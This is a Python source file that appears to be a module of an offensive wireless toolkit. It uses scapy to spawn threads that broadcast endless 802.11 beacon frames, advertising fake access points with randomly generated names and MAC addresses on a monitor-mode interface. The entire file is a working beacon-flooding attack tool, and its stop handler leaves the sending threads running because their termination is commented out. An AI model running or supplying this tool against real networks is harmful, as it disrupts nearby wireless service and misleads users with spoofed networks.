from scapy.all import *
from core import base
from threading import Thread
from faker import Faker

conf.verb = 0

class Main(base.Module):
    """Spamming Fake access points """

    parameters = {
        "iface": "wlan0mon",
        "count": 10,
    }
    completions = list(parameters.keys())

    def do_execute(self, line):
        """Execute current module"""
        faker = Faker()
        process_list = []
        try:
            for _ in range(int(self.parameters['count'])):
                name = faker.name()
                mac = faker.mac_address()
                p = Thread(target=SpawnAP, args=(name, mac, self.parameters['iface']))
                process_list.append(p)
                p.start()
                self.cp.success(text=f"Access point name : {name} - MAC {mac} started.")
            self.cp.info("Press Ctrl+C for stop ...")
            input("")
        except KeyboardInterrupt:
            self.cp.warning("\nKilling all access points, please wait ...")
            # for p in process_list:
            #     p.terminate()
            #     p.join()
            self.cp.success("Done.")

    def complete_set(self, text, line, begidx, endidx):
        mline = line.partition(' ')[2]
        offs = len(mline) - len(text)
        return [s[offs:] for s in self.completions if s.startswith(mline)]


class SpawnAP:
    def __init__(self, ssid, mac, iface):
        self.ssid = ssid
        self.mac = mac
        self.iface = iface
        self.run()

    def run(self):
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=self.mac, addr3=self.mac)
        beacon = Dot11Beacon()
        essid = Dot11Elt(ID="SSID", info=self.ssid, len=len(self.ssid))
        rsn = Dot11Elt(ID='RSNinfo', info=(
            '\x01\x00'  # RSN Version 1
            '\x00\x0f\xac\x02'  # Group Cipher Suite : 00-0f-ac TKIP
            '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
            '\x00\x0f\xac\x04'  # AES Cipher
            '\x00\x0f\xac\x02'  # TKIP Cipher
            '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
            '\x00\x0f\xac\x02'  # Pre-Shared Key
            '\x00\x00'))  # RSN Capabilities (no extra capabilities)
        frame = RadioTap()/dot11/beacon/essid/rsn
        sendp(frame, inter=0.1, iface=self.iface, loop=1)
